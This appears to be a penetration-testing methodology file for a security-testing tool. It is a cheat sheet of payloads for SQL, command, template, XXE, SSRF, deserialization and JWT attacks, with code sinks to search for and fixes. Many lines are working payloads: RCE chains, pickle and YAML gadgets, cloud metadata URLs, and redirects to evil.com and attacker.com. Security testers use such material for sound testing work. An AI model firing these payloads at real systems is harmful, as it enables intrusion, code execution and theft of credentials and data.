# Generic methodology — always applies

Loaded for every project. Provides the baseline taxonomy and payload families that apply regardless of project class.

## Injection — SQL

### Boolean-based blind
```
' OR '1'='1
' OR '1'='2
' AND SUBSTR(password,1,1)='a
admin'-- -
admin'/*
') OR ('1'='1
```

### Error-based
```
' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a)-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -
' AND 1=CONVERT(int,@@version)-- -
```

### Time-based blind
```
'; SELECT pg_sleep(5)-- -
' AND SLEEP(5)-- -
' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' WAITFOR DELAY '0:0:5'-- -
```

### UNION-based
```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT username,password FROM users-- -
' UNION SELECT banner,NULL FROM v$version-- -
```

### Out-of-band (OOB)
Use only against the sandbox with a loopback listener. Never public collaborators without consent.
- MySQL: `LOAD_FILE('\\\\<listener>\\x')` (Windows), `SELECT ... INTO OUTFILE`.
- MSSQL: `xp_dirtree '\\<listener>\x'`, `xp_cmdshell` if enabled.
- PostgreSQL: `COPY ... TO PROGRAM`, `dblink_connect`.
- Oracle: `UTL_HTTP.REQUEST`, `HTTPURITYPE`.

### Sinks to grep
- Python: `.execute(f"...{var}...")`, `.execute("..." + var)`, `.raw(`.
- JS/TS: `` db.query(`... ${var} ...`) ``, string concat with knex/sequelize raw.
- Go: `fmt.Sprintf("SELECT ...")` into `db.Query`.
- Ruby: `Model.where("col = '#{var}'")`, `.find_by_sql("...#{var}")`.
- PHP: `mysqli_query("..." . $var)`, `$pdo->query("..." . $var)`.
- Java: `Statement.executeQuery("..." + var)` (use PreparedStatement).

## Injection — NoSQL (MongoDB)

```json
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$where": "this.password.match(/^a/)"}
```
JSON vs form parsing is the trick — if an endpoint accepts both, operator injection via JSON often works where the form version didn't.

## Injection — OS command

### Classic
```
; id
| id
`id`
$(id)
&& id
|| id
```

### Argument injection
Even when shell metacharacters are filtered, per-tool flags can exploit:
- `curl --output /etc/passwd <url>` via `-o` in URL.
- `git clone --upload-pack="sh -c 'id'" <url>`.
- `tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c id'`.
- `find . -exec id \;` via `-exec`.
- `wget --output-file=/etc/cron.d/pwn <url>`.
- `ssh -o ProxyCommand="id" <host>`.

### Sinks to grep
- `child_process.exec`, `child_process.execSync` (JS — use `execFile` with an array).
- `os.system`, `subprocess.run(..., shell=True)`, `subprocess.call(shell=True)` (Python — use array form).
- `exec.Command("sh", "-c", ...)` (Go — prefer passing argv).
- `%x[...]`, `Kernel.system("str")`, backticks (Ruby — prefer array form).
- `shell_exec`, `system`, backticks, `passthru` (PHP).
- `Runtime.getRuntime().exec("str")` (Java — use `exec(String[] cmdarray)`).

## Injection — LDAP

```
*)(uid=*))(|(uid=*
*)(|(password=*))
admin)(&))
*)(!(objectClass=*
```

## Injection — XPath

```
' or '1'='1
'] | //*[contains(name(),'
' or name()='
```

## Injection — SSTI

Pick by engine. Test probe first: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`. A `49` echo confirms evaluation.

- **Jinja2 (Python)**: `{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()}}`. Filter bypasses: `{% with ns=namespace() %}{% set ns.x='' %}{{...}}`.
- **Twig (PHP)**: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.
- **ERB (Ruby)**: `<%= system("id") %>`.
- **Freemarker (Java)**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`.
- **Velocity (Java)**: `#set($rt=$x.getClass().forName("java.lang.Runtime"))...`.
- **Handlebars as code**: helper injection `{{#with "s" as |string|}}...{{/with}}`.
- **Pug/Jade**: `#{root.process.mainModule.require('child_process').execSync('id').toString()}`.

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```
Blind variant with out-of-band DTD:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://127.0.0.1:9999/evil.dtd"> %ext;]>
```

Remediation: disable DTD / external entities — `libxml2`: `XML_PARSE_NONET`, JAXP: `FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`, lxml: `resolve_entities=False, no_network=True`.

## Path traversal / zip slip

```
../../../../etc/passwd
..\..\..\..\Windows\System32\drivers\etc\hosts
..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd      (double-url-encoded)
%2e%2e/%2e%2e/etc/passwd
file.png%00../../etc/passwd
\\?\C:\Windows\System32\...        (Windows UNC)
```

Archive-extraction: craft a zip/tar with entries `../../etc/cron.d/pwn` and `symlink → /etc/passwd`. Upload to any "extract archive" endpoint.

## SSRF

```
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/                  AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/       GCP (needs Metadata-Flavor: Google header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   Azure (needs Metadata: true header)
http://100.100.100.200/latest/meta-data/                  Alibaba
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net                       (only with user-owned collaborator)
file:///etc/passwd
gopher://127.0.0.1:6379/_FLUSHALL
dict://127.0.0.1:11211/stats
ldap://127.0.0.1/
http://2130706433/                                         decimal 127.0.0.1
http://0177.0.0.1/                                         octal 127
http://[::ffff:127.0.0.1]/
```

Bypass tactics:
- DNS rebinding (host resolves differently on first vs second query).
- Redirect to metadata (`http://attacker.com/r` → 302 to `http://169.254.169.254`).
- Trailing dot: `169.254.169.254.` may bypass prefix matching.
- @-tricks: `http://allowed.com@169.254.169.254/`.

Fix pattern: parse URL → resolve host → check resolved IP against RFC1918/link-local/metadata ranges → disable redirect following OR re-check on redirect → re-resolve before fetch.

## Open redirects / HTTP response splitting

```
?next=//evil.com
?next=/\evil.com
?next=%0d%0aSet-Cookie:%20x=y
?url=javascript:alert(1)
```

## Header injection / CRLF

Any request header or response header built from user input. Check `\r\n` injection into `Location`, `Set-Cookie`, custom `X-*` headers.

## Prototype pollution (Node)

JSON with `__proto__` / `constructor.prototype`:
```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Sinks: `Object.assign(target, userInput)`, `_.merge`, `_.set`, `_.defaultsDeep`, `$.extend(true, ...)`, recursive cloners. Modern fix: `Object.create(null)` for target, or use `immer`, or structural validation.

## Mass assignment / BOPLA

```json
{"name":"new","role":"admin","isVerified":true,"tenantId":"victim-tenant"}
```
Check by POSTing with spurious fields and inspecting whether they persist. Fix: explicit field allow-list per action (pydantic model per endpoint, DTOs, serializer whitelists).

## Deserialization

### Python pickle (one-liner gadget)
```python
import pickle, base64, os
class E:
    def __reduce__(self): return (os.system, ('touch /tmp/pwn',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

### YAML (Python, pre-safe_load)
```yaml
!!python/object/apply:os.system ["touch /tmp/pwn"]
```

### Node `node-serialize`
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('touch /tmp/pwn')}()"}
```

### Ruby Marshal / YAML
Generate with gadgets like `Psych.load` on crafted YAML; see `ruby-deserialization-gadgets`.

## JWT attacks

- `alg=none`: change header to `{"alg":"none","typ":"JWT"}`, sign with empty signature.
- `alg` confusion (RS→HS): if server accepts either and does not pin, sign with HMAC using the public key bytes as the secret.
- `kid` injection: `{"kid":"../../../dev/null"}` or SQLi `kid`.
- Weak secret: `hashcat -m 16500 token.jwt wordlist` or `jwt_tool -C -d wordlist token`.
- Expired-token acceptance: send with `exp` in the past; server accepts = bug.
- Audience/issuer not validated: change `aud` to attacker-owned; server still trusts.

## Race conditions (concurrency harness)

Python:
```python
import asyncio, httpx
async def hit(): return await client.post("/redeem", json={"code":"ABC"})
async def main():
    async with httpx.AsyncClient(base_url="http://sandbox") as client:
        r = await asyncio.gather(*[hit() for _ in range(50)])
        successes = sum(1 for x in r if x.status_code == 200)
        assert successes == 1, f"race allowed {successes} redemptions"
asyncio.run(main())
```

Go:
```go
g, _ := errgroup.WithContext(ctx)
for i := 0; i < 50; i++ {
    g.Go(func() error {
        resp, err := http.Post("http://sandbox/redeem", "application/json",
            strings.NewReader(`{"code":"ABC"}`))
        if err == nil && resp.StatusCode == 200 { atomic.AddInt64(&succ, 1) }
        return nil
    })
}
g.Wait()
if succ != 1 { t.Fatalf("race allowed %d redemptions", succ) }
```

## CVSS v3.1 quick reference

```
AV: Attack Vector         N Network | A Adjacent | L Local | P Physical
AC: Attack Complexity     L Low | H High
PR: Privileges Required   N None | L Low | H High
UI: User Interaction      N None | R Required
S:  Scope                 U Unchanged | C Changed
C:  Confidentiality       N | L | H
I:  Integrity             N | L | H
A:  Availability          N | L | H
```
Example vector for unauth RCE: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → 10.0 Critical.

## CWE quick reference (common)

- CWE-20 improper input validation
- CWE-22 path traversal
- CWE-74 injection (general)
- CWE-78 OS command injection
- CWE-79 XSS
- CWE-89 SQL injection
- CWE-94 code injection
- CWE-200 information exposure
- CWE-287 improper authentication
- CWE-284 improper access control
- CWE-306 missing authentication for critical function
- CWE-311 missing encryption
- CWE-327 broken/risky crypto algorithm
- CWE-352 CSRF
- CWE-359 PII exposure
- CWE-416 UAF
- CWE-434 unrestricted file upload
- CWE-502 insecure deserialization
- CWE-601 open redirect
- CWE-611 XXE
- CWE-639 IDOR / BOLA
- CWE-732 insecure default permissions
- CWE-776 XML entity expansion (billion laughs)
- CWE-798 hard-coded credentials
- CWE-862 missing authorization
- CWE-863 incorrect authorization
- CWE-918 SSRF
- CWE-1021 UI redress / clickjacking
